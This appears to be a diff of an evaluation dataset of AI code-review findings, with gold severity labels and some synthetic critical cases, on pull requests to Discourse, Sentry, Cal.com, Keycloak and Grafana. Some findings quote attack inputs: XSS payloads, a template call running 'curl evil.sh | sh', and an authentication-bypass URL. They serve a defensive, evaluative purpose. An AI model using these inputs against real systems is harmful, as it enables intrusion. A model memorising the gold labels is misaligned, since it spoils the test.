     "suggestionContent": "WHAT: Downsize loop passes percentage geometry `\"80%\"` to `downsize_instructions` which appends `\\>`/`\\!` (yields `80%\\>`) and to animated path `resize_instructions_animated` (`gifsicle --resize-fit`) which expects `WxH`. WHY: Produces invalid/unexpected geometry — convert/gifsicle fails or mis-resizes, return value ignored so loop burns 5 attempts then uploads oversized/corrupt file. HOW: Pass `WxH` dimensions (e.g. compute from FastImage) or add explicit percent handling without `\\>` suffix and check return value."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra-conceded"
   },
   {
    "issueId": "implement-recovery-key-support-for-user-storage-providers-keycloak#05",
@@ -2205,12 +2479,14 @@
     "relevantLinesStart": 125,
     "relevantLinesEnd": 130,
     "suggestionContent": "When updateCredential succeeds in user storage, the user's existing local recovery-codes credential is not deleted. Only the local createCredential path removes the old one. UserCredentialManager.isValid also runs the local RecoveryAuthnCodesCredentialProvider, which checks the stored DB credential, so the old codes that were meant to be replaced can still be used to log in. Fix: in the userStorageCreated branch, also delete any stored local credential of type recovery-authn-codes."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "junior"
   },
   {
    "issueId": "feat-upsampling-support-upsampled-error-count-with-performance-optimizations-sentry#15",
    "caseId": "feat-upsampling-support-upsampled-error-count-with-performance-optimizations-sentry",
-   "severity": "high",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "bug",
    "label": "bug",
@@ -2220,7 +2496,9 @@
     "relevantLinesStart": 218,
     "relevantLinesEnd": 223,
     "suggestionContent": "WHAT: When upsampling is active the query is sent as the transformed columns (final_columns, e.g. 'upsampled_count() as count') while serialization still uses the original query_columns ('count()'), so under transformAliasToInputFormat=1 the expected result key and the produced key diverge. WHY: resolve_axis_column returns the input string 'count()' when transform_alias_to_input_format is True (organization_events.py:75-76), but the query builder re-keys data rows to the function's field string, which for the injected column is 'upsampled_count()' (base.py:1566-1573, 1613); serializer.serialize then reads r.get('count()', 0) (snuba.py:92) and silently yields 0 for every bucket, so an allowlisted error-stats request with transformAliasToInputFormat=1 returns all-zero counts. HOW: make the serializer use the same transformed column/alias that was sent to the builder (e.g. have _get_event_stats return final_columns and thread them into get_event_stats_data/serialize_multiple_axis, or keep the alias as the original function name so it round-trips through transform_alias_to_input_format)."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "oauth-credential-sync-and-app-integration-enhancements-cal-com#09",
@@ -2235,7 +2513,9 @@
     "relevantLinesStart": 8,
     "relevantLinesEnd": 15,
     "suggestionContent": "When the credential-sync endpoint is used, the function returns the raw fetch Response, but every caller expects parsed JSON (e.g., res?.data in googlecalendar, handleErrorsJson in office365calendar, .data in zoho callers, handleZoomResponse/handleWebexResponse/handleLarkError in others). Returning Response causes property-access crashes or incorrect parsing when credential sharing is enabled. Parse the response body (response.json()) and return the parsed object so caller semantics are preserved."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-handle-collective-multiple-host-on-destinationcalendar-cal-com#08",
@@ -2250,13 +2530,14 @@
     "relevantLinesStart": 1063,
     "relevantLinesEnd": 1079,
     "suggestionContent": "When neither eventType nor the organizer has a destinationCalendar, evt.destinationCalendar is set to null, so the optional-chained push at line 1078 drops all collected teamDestinationCalendars for collective events. Initialize to [] instead of null (or assign via spread) so team members' calendars are actually included."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "oauth-credential-sync-and-app-integration-enhancements-cal-com#01",
    "caseId": "oauth-credential-sync-and-app-integration-enhancements-cal-com",
    "severity": "medium",
-   "severityBefore": "high",
    "classReviewed": "FP nit",
    "category": "security",
    "label": "security",
@@ -2266,12 +2547,14 @@
     "relevantLinesStart": 24,
     "relevantLinesEnd": 27,
     "suggestionContent": "WHAT: Webhook secret validation uses `req.headers[...] !== process.env.CALCOM_WEBHOOK_SECRET`.\nWHY: Non-constant-time string comparison leaks timing information that an attacker can exploit to guess CALCOM_WEBHOOK_SECRET byte-by-byte and then overwrite arbitrary user credentials.\nHOW: Use a constant-time comparison such as `crypto.timingSafeEqual` after encoding both values to Buffers of equal length."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "junior"
   },
   {
    "issueId": "feat-uptime-add-ability-to-use-queues-to-manage-parallelism-sentry#11",
    "caseId": "feat-uptime-add-ability-to-use-queues-to-manage-parallelism-sentry",
-   "severity": "critical",
+   "severity": "high",
    "classReviewed": "TP",
    "category": "bug",
    "label": "bug",
@@ -2281,7 +2564,9 @@
     "relevantLinesStart": 335,
     "relevantLinesEnd": 342,
     "suggestionContent": "WHAT: SimpleQueueProcessingStrategy.close/terminate shuts down the factory-shared FixedQueuePool, and each create_with_partitions spawns a new commit thread sharing the same OffsetTracker. WHY: on rebalance/second create_with_partitions the old strategy's close kills the shared pool for the new strategy (puts raise ShutDown, offsets leak) or leaves multiple commit threads calling stale commit callbacks."
-   }
+   },
+   "severityGold": "critical",
+   "labelBy": "astra"
   },
   {
    "issueId": "enhance-embed-url-handling-and-validation-system-discourse-cursor#09",
@@ -2296,7 +2581,9 @@
     "relevantLinesStart": 13,
     "relevantLinesEnd": 13,
     "suggestionContent": "`url` is put inside a single-quoted href attribute and as link text without HTML escaping. embed_url comes from the request parameter and only its host is validated, so a URL like `http://host/x'onmouseover='alert(1)` injects attributes into the stored post, which is rendered as raw HTML. Escape the URL with ERB::Util.html_escape (or build the link with Nokogiri) before interpolating it."
-   }
+   },
+   "severityGold": "critical",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-2fa-backup-codes-cal-com#01",
@@ -2311,12 +2598,14 @@
     "relevantLinesStart": 131,
     "relevantLinesEnd": 145,
     "suggestionContent": "The backup-code branch accepts requests containing a nonempty totpCode without verifying either the password or that TOTP. The existing password checks at lines 113–125 are skipped when totpCode is supplied, so an attacker possessing a backup code can submit an arbitrary totpCode and log into a CAL account without its password. Require password verification for CAL backup-code authentication independently of whether totpCode is present."
-   }
+   },
+   "severityGold": "critical",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-groups-resource-type-and-scopes-to-authorization-schema-keycloak#01",
    "caseId": "add-groups-resource-type-and-scopes-to-authorization-schema-keycloak",
-   "severity": "critical",
+   "severity": "high",
    "classReviewed": "TP",
    "category": "bug",
    "label": "bug",
@@ -2326,7 +2615,9 @@
     "relevantLinesStart": 64,
     "relevantLinesEnd": 71,
     "suggestionContent": "Global canManage() treats the VIEW scope as sufficient for management. GroupsResource.addTopLevelGroup() calls auth.groups().requireManage(), which delegates here, so a principal with only an all-groups VIEW permission can create top-level groups. The fallback permission check should require only AdminPermissionsSchema.MANAGE, not VIEW."
-   }
+   },
+   "severityGold": "critical",
+   "labelBy": "astra"
   },
   {
    "issueId": "enhance-embed-url-handling-and-validation-system-discourse-cursor#08",
@@ -2341,7 +2632,9 @@
     "relevantLinesStart": 131,
     "relevantLinesEnd": 133,
     "suggestionContent": "`Post#cook` returns `raw` unmodified for `raw_html` posts, so imported RSS or remote-page HTML skips all sanitization. That HTML is later output with `raw post.cooked` in the embed view and in normal topic rendering, giving stored XSS if the feed or site is malicious or compromised. Sanitize the HTML (e.g. `Sanitize.clean` with a relaxed whitelist, or in `TopicEmbed.import`) before storing or returning it."
-   }
+   },
+   "severityGold": "critical",
+   "labelBy": "astra"
   },
   {
    "issueId": "feature-automatically-downsize-large-images-discourse-cursor#opa-01",
@@ -2356,12 +2649,14 @@
     "relevantLinesStart": 64,
     "relevantLinesEnd": 69,
     "suggestionContent": "WHAT: tempfile.path is now passed to OptimizedImage.downsize, and convert_with runs it in a shell through backticks without escaping. For API URL uploads, that path contains the request-controlled `type` param (`discourse-upload-#{type}`). WHY: A `type` containing shell metacharacters such as `$(...)` or `;` runs arbitrary commands on the server when the oversized image is downsized. HOW: Restrict `type` to a whitelist (or Shellwords-escape every argument in convert_with) before the path reaches the shell."
-   }
+   },
+   "severityGold": "critical",
+   "labelBy": "astra"
   },
   {
    "issueId": "sms-workflow-reminder-retry-count-tracking-cal-com#06",
    "caseId": "sms-workflow-reminder-retry-count-tracking-cal-com",
-   "severity": "critical",
+   "severity": "high",
    "classReviewed": "TP",
    "category": null,
    "label": "bug",
@@ -2371,13 +2666,14 @@
     "relevantLinesStart": 189,
     "relevantLinesEnd": 198,
     "suggestionContent": "WHAT: The catch block now increments retryCount for every exception thrown anywhere in the loop body, including transient infrastructure errors (prisma.profile.findFirst, getBookerBaseUrl, the reminder lookups) that have nothing to do with SMS delivery. WHY: A transient DB/network hiccup will bump retryCount and, together with the `retryCount > 1` delete condition, permanently delete the reminder after two failed cron runs, whereas previously such an error was only logged and the reminder retried next run. HOW: scope the retry increment to SMS-provider failures (e.g. only increment around the scheduleSMS call) rather than the whole try/catch, so unrelated errors do not consume the retry budget."
-   }
+   },
+   "severityGold": "critical",
+   "labelBy": "astra"
   },
   {
    "issueId": "oauth-credential-sync-and-app-integration-enhancements-cal-com#10",
    "caseId": "oauth-credential-sync-and-app-integration-enhancements-cal-com",
    "severity": "high",
-   "severityBefore": "critical",
    "classReviewed": "TP",
    "category": "data",
    "label": "bug",
@@ -2387,7 +2683,778 @@
     "relevantLinesStart": 97,
     "relevantLinesEnd": 101,
     "suggestionContent": "`parseRefreshTokenResponse` returns a zod SafeParse result (`{success, data}`), and that whole wrapper is saved as `credential.key`. After the first refresh the stored credential is corrupted: `googleCredentialSchema.parse(credential.key)` fails on the next load and the Google Calendar integration breaks. Fix: persist `parseRefreshTokenResponse(...).data` instead of the wrapper."
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "enhance-embed-url-handling-and-validation-system-discourse-cursor#24",
+   "caseId": "enhance-embed-url-handling-and-validation-system-discourse-cursor",
+   "severityGold": "low",
+   "classReviewed": "FP nit",
+   "category": "bug",
+   "label": "bug",
+   "source": "inventory:deepseek-v4.1-flash|enhance-embed-url-handling-and-validation-system-discourse-cursor|S4",
+   "finding": {
+    "relevantFile": "app/views/embed/best.html.erb",
+    "relevantLinesStart": 14,
+    "relevantLinesEnd": 14,
+    "suggestionContent": "The post date uses a hard-coded strftime format `\"%e %b %Y\"`. `%b` emits English month abbreviations (Jan, Feb, ...) no matter what locale the viewer is in, so the date is frozen to en-US while the surrounding strings in this same view are localized via I18n.t. This is a locale-pinned user-facing format; it should be localized (e.g. via the app's localized date helper / l( ) rather than a literal strftime pattern)."
+   },
+   "severity": "low",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "enhanced-pagination-performance-for-high-volume-audit-logs-sentry#02",
+   "caseId": "enhanced-pagination-performance-for-high-volume-audit-logs-sentry",
+   "severityGold": "low",
+   "classReviewed": "FP nit",
+   "category": "doc_defect",
+   "label": "bug",
+   "source": "inventory:deepseek-v4.1-flash|enhanced-pagination-performance-for-high-volume-audit-logs-sentry|S3",
+   "finding": {
+    "relevantFile": "src/sentry/api/paginator.py",
+    "relevantLinesStart": 179,
+    "relevantLinesEnd": 184,
+    "suggestionContent": "The added comment says this change will \"allow negative offsets to enable efficient bidirectional pagination ... safe because the underlying queryset will handle boundary conditions\", but the statement it annotates, line 182, is `start_offset = max(0, offset) if not cursor.is_prev else offset` — it clamps negative offsets to 0, i.e. it does the opposite of what the comment claims and leaves the 'negative offset' (offset < 0) paging behaviour exactly as before. The comment is now untrue for the code it sits on; either drop the 'allow negative offsets' wording or make the code actually permit them."
+   },
+   "severity": "low",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "add-groups-resource-type-and-scopes-to-authorization-schema-keycloak#kimi-01",
+   "caseId": "add-groups-resource-type-and-scopes-to-authorization-schema-keycloak",
+   "severityGold": "low",
+   "classReviewed": "FP nit",
+   "category": "doc_defect",
+   "label": "bug",
+   "source": "round:kimi/classif-in.json:kimi-kimi:S7",
+   "finding": {
+    "relevantFile": "services/src/main/java/org/keycloak/services/resources/admin/permissions/GroupPermissionEvaluator.java",
+    "relevantLinesStart": 85,
+    "relevantLinesEnd": 92,
+    "suggestionContent": "The interface Javadoc says VIEW/MANAGE permissions grant canView(), but the legacy GroupPermissions implementation only checks admin roles. Either implement the permission check in V1 or qualify the permission path as V2-only (as was done for canList) so the contract matches all implementations."
+   },
+   "severity": "low",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "fix-handle-collective-multiple-host-on-destinationcalendar-cal-com#pf-kimi-C2",
+   "caseId": "fix-handle-collective-multiple-host-on-destinationcalendar-cal-com",
+   "severityGold": "low",
+   "classReviewed": "FP nit",
+   "category": "perf",
+   "label": "performance",
+   "source": "round:prod-finder/classif-in.json:prodfinder-kimi:C2",
+   "finding": {
+    "relevantFile": "packages/features/bookings/lib/handleCancelBooking.ts",
+    "relevantLinesStart": 422,
+    "relevantLinesEnd": 441,
+    "suggestionContent": "WHAT: `handleCancelBooking` calls `prisma.credential.findUnique` inside a loop over calendar references. WHY: Cancelling a collective booking issues one credential query per host calendar reference rather than a single batched query. HOW: Collect all `credentialId` values from `bookingCalendarReference`, run one `prisma.credential.findMany({ where: { id: { in: ids } } })`, and map the results."
+   },
+   "severity": "low",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "scale-color-lightness-must-use-secondary-for-dark-themes-discourse-cursor#03",
+   "caseId": "scale-color-lightness-must-use-secondary-for-dark-themes-discourse-cursor",
+   "severityGold": "low",
+   "classReviewed": "TP",
+   "category": "speculative",
+   "label": "bug",
+   "source": "lean:muse",
+   "finding": {
+    "relevantFile": "app/assets/stylesheets/desktop/user.scss",
+    "relevantLinesStart": 519,
+    "relevantLinesEnd": 523,
+    "suggestionContent": "WHAT: .group-member-info .name light branch uses $lightness: 50% while original was $lightness: 30%. WHY: Lightens light-theme name color vs original; common/base/user.scss preserves 30%/70% for .name. HOW: Change first arg back to scale-color($primary, $lightness: 30%) with dark complement 70%."
+   },
+   "severity": "low",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "github-oauth-security-enhancement-sentry#02",
+   "caseId": "github-oauth-security-enhancement-sentry",
+   "severityGold": "low",
+   "classReviewed": "FP nit",
+   "category": "style",
+   "label": "bug",
+   "source": "inventory:deepseek-v4.1-flash|github-oauth-security-enhancement-sentry|S3",
+   "finding": {
+    "relevantFile": "src/sentry/integrations/github/integration.py",
+    "relevantLinesStart": 149,
+    "relevantLinesEnd": 152,
+    "suggestionContent": "The parameter is named `org` but the code treats it as the pipeline's active-organization context: it dereferences `org.organization` and every caller (error() and the GitHubInstallation sites) passes `self.active_organization`, not an Organization. The name misstates the argument's type/contract — a caller following the name and passing a real Organization would hit AttributeError on `.organization`. Rename the parameter (e.g. `active_organization`) and correct the corresponding name in `error()` at line 131 so the two signatures match what is actually passed."
+   },
+   "severity": "low",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "feat-convert-insightsbookingservice-to-use-prisma-sql-raw-queries-cal-com#prod-01",
+   "caseId": "feat-convert-insightsbookingservice-to-use-prisma-sql-raw-queries-cal-com",
+   "severityGold": "low",
+   "classReviewed": "FP nit",
+   "category": "test_gap",
+   "label": "bug",
+   "source": "lean:ds20",
+   "finding": {
+    "relevantFile": "packages/lib/server/service/__tests__/insightsBooking.integration-test.ts",
+    "relevantLinesStart": 433,
+    "relevantLinesEnd": 437,
+    "suggestionContent": "WHAT: The entire `describe(\"Caching\")` block (the only tests exercising cachedAuthConditions/cachedFilterConditions) was deleted, while the service still ships the caching layer (insightsBooking.ts lines 49-50, 84-94). WHY: nothing now verifies that repeated getAuthorizationConditions()/getFilterConditions() calls return the cached result, so a regression that recomputes (or worse, returns stale/incorrect conditions) in the caching path would go undetected. HOW: re-add caching tests or, if caching is being intentionally dropped, remove the cachedAuthConditions/cachedFilterConditions fields and their logic from the service in the same PR to keep code and tests consistent."
+   },
+   "severity": "low",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "feat-add-calendar-cache-status-and-actions-22532-cal-com#07",
+   "caseId": "feat-add-calendar-cache-status-and-actions-22532-cal-com",
+   "severityGold": "low",
+   "classReviewed": "FP nit",
+   "category": "bug",
+   "label": "bug",
+   "source": "lean:gpt",
+   "finding": {
+    "relevantFile": "scripts/test-gcal-webhooks.sh",
+    "relevantLinesStart": 68,
+    "relevantLinesEnd": 68,
+    "suggestionContent": "The environment update uses BSD sed syntax (`sed -i ''`), which fails with GNU sed on Linux. When GOOGLE_WEBHOOK_URL already exists, the script leaves the old URL in place but still reports success, so webhook testing continues targeting the previous tunnel. Use a portable temporary-file replacement or choose the appropriate in-place syntax for the host platform, and check the command's exit status."
+   },
+   "severity": "medium",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "replays-self-serve-bulk-delete-system-sentry#snloop-01",
+   "caseId": "replays-self-serve-bulk-delete-system-sentry",
+   "severityGold": "low",
+   "classReviewed": "FP nit",
+   "category": "doc_defect",
+   "label": "bug",
+   "source": "round:snloop/classif-in.json:sonnet-snloop:S7",
+   "finding": {
+    "relevantFile": "src/sentry/issues/endpoints/browser_reporting_collector.py",
+    "relevantLinesStart": 50,
+    "relevantLinesEnd": 60,
+    "suggestionContent": "The docstrings say validate_timestamp checks that 'age is absent, but timestamp is present' and validate_age checks that 'age is present, but not timestamp'. The code only rejects the case where both fields are supplied. Both fields are required=False, so a report with neither passes. Reword the docstrings to say they only enforce mutual exclusion, or add a check that one of the two is present."
+   },
+   "severity": "medium",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "feature-automatically-downsize-large-images-discourse-cursor#05",
+   "caseId": "feature-automatically-downsize-large-images-discourse-cursor",
+   "severityGold": "low",
+   "classReviewed": "FP nit",
+   "category": "doc_defect",
+   "label": "bug",
+   "source": "lean:kimi20",
+   "finding": {
+    "relevantFile": "app/controllers/uploads_controller.rb",
+    "relevantLinesStart": 63,
+    "relevantLinesEnd": 70,
+    "suggestionContent": "The downsize loop runs at most five 80%-resize iterations and does not check whether OptimizedImage.downsize succeeded. After five passes a 10 MB file is still ~3.3 MB, so it can remain above SiteSetting.max_image_size_kb and Upload.create_for will store an oversized file. Verify the downsize result and loop until the file is actually within the configured limit, or reject the upload if it cannot be reduced."
+   },
+   "severity": "medium",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "advanced-sql-analytics-framework-grafana-codex#muse13-01",
+   "caseId": "advanced-sql-analytics-framework-grafana-codex",
+   "severityGold": "low",
+   "classReviewed": "FP nit",
+   "category": "style",
+   "label": "bug",
+   "source": "round:muse13/classif-in.json:muse-muse13:S5",
+   "finding": {
+    "relevantFile": "pkg/expr/sql/db.go",
+    "relevantLinesStart": 24,
+    "relevantLinesEnd": 26,
+    "suggestionContent": "Name NewInMemoryDB promises the working in-memory DB callers in parser.go and sql_command.go expect from duck.NewInMemoryDB, but the new type holds no state and every method returns 'not implemented'. Rename to reflect stub status (e.g. NewStubDB/NewDisabledDB) or document that it is intentionally unimplemented so callers are not misled."
+   },
+   "severity": "high",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "feature-automatically-downsize-large-images-discourse-cursor#09",
+   "caseId": "feature-automatically-downsize-large-images-discourse-cursor",
+   "severityGold": "high",
+   "classReviewed": "TP",
+   "category": "bug",
+   "label": "bug",
+   "source": "lean:kimi",
+   "finding": {
+    "relevantFile": "app/controllers/uploads_controller.rb",
+    "relevantLinesStart": 63,
+    "relevantLinesEnd": 70,
+    "suggestionContent": "In-place downsizing of the open Tempfile may leave the Ruby file descriptor pointing at the original inode. WHAT: OptimizedImage.downsize overwrites tempfile.path while the Tempfile object is still open, so tempfile.size and subsequent reads can see the original large file instead of the downsampled one. WHY: If ImageMagick writes to a new inode and renames it into place, the loop guard and Upload.create_for receive stale size/content and the automatic downsizing effectively does nothing. HOW: downsample to a separate temp path, then replace the original and reopen/rewind the Tempfile, or use File.size(tempfile.path) and read from the path after downsizing."
+   },
+   "severity": "high",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "feature-can-edit-category-host-relationships-for-embedding-discourse-cursor#06",
+   "caseId": "feature-can-edit-category-host-relationships-for-embedding-discourse-cursor",
+   "severityGold": "high",
+   "classReviewed": "FP nit",
+   "category": "security",
+   "label": "security",
+   "source": "lean:muse",
+   "finding": {
+    "relevantFile": "db/migrate/20150818190757_create_embeddable_hosts.rb",
+    "relevantLinesStart": 24,
+    "relevantLinesEnd": 26,
+    "suggestionContent": "WHAT: migration interpolates raw site_settings value h directly into INSERT string ('#{h}'). WHY: a stored host containing a quote breaks the migration and gives SQL injection from an admin-controlled setting value into schema-migration SQL. HOW: quote/sanitize values or insert via parameterized exec / model create."
+   },
+   "severity": "high",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "feat-uptime-add-ability-to-use-queues-to-manage-parallelism-sentry#01",
+   "caseId": "feat-uptime-add-ability-to-use-queues-to-manage-parallelism-sentry",
+   "severityGold": "high",
+   "classReviewed": "TP",
+   "category": null,
+   "label": "bug",
+   "source": "lean:opus",
+   "finding": {
+    "relevantFile": "src/sentry/remote_subscriptions/consumers/queue_consumer.py",
+    "relevantLinesStart": 86,
+    "relevantLinesEnd": 96,
+    "suggestionContent": "get_committable_offsets only moves forward while every offset in the range is present in all_offsets, so it stops at any offset that was never delivered. Kafka partitions can have legitimate offset gaps (transaction control markers, log compaction), so after one gap the partition never commits again and the consumer lag grows forever. Fix: track offsets in submission order (for example, an ordered deque per partition) and commit up to the last completed offset that has no earlier outstanding entry, rather than requiring numerically contiguous offsets."
+   },
+   "severity": "high",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "feature-per-topic-unsubscribe-option-in-emails-discourse-cursor#10",
+   "caseId": "feature-per-topic-unsubscribe-option-in-emails-discourse-cursor",
+   "severityGold": "high",
+   "classReviewed": "TP",
+   "category": null,
+   "label": "bug",
+   "source": "lean:gpt",
+   "finding": {
+    "relevantFile": "app/assets/javascripts/discourse/routes/topic-unsubscribe.js.es6",
+    "relevantLinesStart": 4,
+    "relevantLinesEnd": 8,
+    "suggestionContent": "The client-side unsubscribe route only calls PostStream.loadTopicView, which fetches the ordinary topic JSON endpoint rather than invoking the unsubscribe action. A client-side transition to this route displays the unsubscribe confirmation while leaving the notification level unchanged; only a full server request currently changes it. Have the route perform the preference-changing request before showing success, or require an explicit submission on this page."
+   },
+   "severity": "high",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "add-guest-management-functionality-to-existing-bookings-cal-com#kimip-02",
+   "caseId": "add-guest-management-functionality-to-existing-bookings-cal-com",
+   "severityGold": "high",
+   "classReviewed": "FP nit",
+   "category": "bug",
+   "label": "bug",
+   "source": "lean:kimi20",
+   "finding": {
+    "relevantFile": "packages/trpc/server/routers/viewer/bookings/addGuests.handler.ts",
+    "relevantLinesStart": 92,
+    "relevantLinesEnd": 106,
+    "suggestionContent": "WHAT: new attendees are inserted without checking booking.eventType.seatsPerTimeSlot and without creating BookingSeat records. WHY: the existing seat-capacity guard in createNewSeat.ts counts attendees with a bookingSeat relation, so this endpoint can overbook seated events by adding guests that bypass the limit. HOW: before the prisma.booking.update createMany, reject the request when seatsPerTimeSlot is set and the resulting attendee count would exceed it, and create BookingSeat records for seated guests so they are counted consistently."
+   },
+   "severity": "high",
+   "labelBy": "astra"
+  },
+  {
+   "issueId": "synthetic-critical#03",
+   "caseId": "synthetic-critical#03",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "discourse",
+   "finding": {
+    "relevantFile": "app/assets/javascripts/discourse/components/user-card-contents.js",
+    "relevantLinesStart": 52,
+    "relevantLinesEnd": 55,
+    "suggestionContent": "WHAT: `bio_excerpt` is now rendered with `htmlSafe(user.bio_raw)` instead of the cooked, sanitized `bio_cooked`. WHY: `bio_raw` is whatever the user typed, so any user can put `<img src=x onerror=...>` in their bio and it executes in the browser of every visitor, including staff, who opens their user card. HOW: render `bio_cooked` as before."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#04",
+   "caseId": "synthetic-critical#04",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "sentry",
+   "finding": {
+    "relevantFile": "src/sentry/api/endpoints/organization_member_details.py",
+    "relevantLinesStart": 210,
+    "relevantLinesEnd": 218,
+    "suggestionContent": "put() now applies `role` from the request body before checking `can_admin_member`, and the check was moved inside the `teams` branch. A member with role `member` can send `{\"role\": \"owner\"}` for their own membership and becomes an organization owner. Restore the permission check before any field is written."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#05",
+   "caseId": "synthetic-critical#05",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "grafana",
+   "finding": {
+    "relevantFile": "pkg/services/ngalert/notifier/channels/webhook_template.go",
+    "relevantLinesStart": 61,
+    "relevantLinesEnd": 70,
+    "suggestionContent": "WHAT: the webhook body template is now executed with `text/template` and a FuncMap that includes `exec` (os/exec wrapper added for the new `{{ shell }}` helper). WHY: any editor can save a contact point whose template calls `{{ shell \"curl evil.sh | sh\" }}`, and the Grafana server runs it on the next alert. HOW: drop the shell helper; templates must not reach process execution."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#06",
+   "caseId": "synthetic-critical#06",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "bug",
+   "source": "synthetic",
+   "repo": "sentry",
+   "finding": {
+    "relevantFile": "src/sentry/tasks/process_buffer.py",
+    "relevantLinesStart": 77,
+    "relevantLinesEnd": 89,
+    "suggestionContent": "process_incr() now acks the batch in a `finally` block, including when `buffer.process()` raises. Any exception in processing (a DB timeout, a bad row) marks the whole batch as done and deletes it from Redis without applying the counts. Every failure silently drops all buffered increments of that batch, and this repeats for every batch while the error persists. Ack only after a successful process."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#07",
+   "caseId": "synthetic-critical#07",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "keycloak",
+   "finding": {
+    "relevantFile": "services/src/main/java/org/keycloak/services/resources/admin/UsersResource.java",
+    "relevantLinesStart": 140,
+    "relevantLinesEnd": 147,
+    "suggestionContent": "WHAT: createUser() skips `auth.users().requireManage()` when the request carries the new `X-Import-Mode` header. WHY: the header is not restricted to any role, so any authenticated admin-console user, even with only view-users, can create users and set their credentials and realm roles, including realm-admin. HOW: check the permission regardless of the header."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#08",
+   "caseId": "synthetic-critical#08",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "cal.com",
+   "finding": {
+    "relevantFile": "packages/app-store/_utils/oauth/decodeOAuthState.ts",
+    "relevantLinesStart": 8,
+    "relevantLinesEnd": 14,
+    "suggestionContent": "decodeOAuthState now deserializes `state` with `eval('(' + state + ')')` to support the legacy format. `state` comes back from the OAuth provider in the callback URL, so anyone can craft a callback link whose `state` is arbitrary JavaScript, and it runs on the server with the app's environment and database credentials. Parse it with JSON.parse."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#09",
+   "caseId": "synthetic-critical#09",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "discourse",
+   "finding": {
+    "relevantFile": "app/controllers/session_controller.rb",
+    "relevantLinesStart": 312,
+    "relevantLinesEnd": 320,
+    "suggestionContent": "WHAT: `email_login` now logs in the user found by `params[:email]` when the token lookup returns nil, as a fallback for expired links. WHY: anyone can request `/session/email-login/anything?email=admin@site` and is logged in as that user without the token, the password or any second factor. HOW: return an error when the token is invalid; never fall back to the email."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#11",
+   "caseId": "synthetic-critical#11",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "sentry",
+   "finding": {
+    "relevantFile": "src/sentry/utils/safe_pickle.py",
+    "relevantLinesStart": 15,
+    "relevantLinesEnd": 22,
+    "suggestionContent": "WHAT: `load_project_option` now calls `pickle.loads` on the value of the `sentry:custom-grouping` option. WHY: project admins write that option through the public options API, so a project admin can store a crafted pickle that executes arbitrary code in every worker that loads the project's grouping config. HOW: store the option as JSON and load it with json.loads."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#12",
+   "caseId": "synthetic-critical#12",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "cal.com",
+   "finding": {
+    "relevantFile": "packages/features/ee/teams/lib/inviteMember.ts",
+    "relevantLinesStart": 45,
+    "relevantLinesEnd": 52,
+    "suggestionContent": "The membership role is taken from `input.role` without checking the inviter's own role. A team MEMBER can invite their second account with `role: \"OWNER\"`, accept the invite and then remove every other owner, take over billing and delete the team. Only allow roles at or below the inviter's."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#13",
+   "caseId": "synthetic-critical#13",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "keycloak",
+   "finding": {
+    "relevantFile": "services/src/main/java/org/keycloak/protocol/oidc/TokenManager.java",
+    "relevantLinesStart": 402,
+    "relevantLinesEnd": 409,
+    "suggestionContent": "WHAT: verifyAccessToken() now accepts tokens whose `alg` header is `none` and skips the signature check for them, to support the new internal test clients. WHY: anyone can forge an unsigned access token with any `sub` and `realm_access.roles`, including admin, and every resource server that uses this verifier accepts it. HOW: reject `none` unconditionally."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#14",
+   "caseId": "synthetic-critical#14",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "discourse",
+   "finding": {
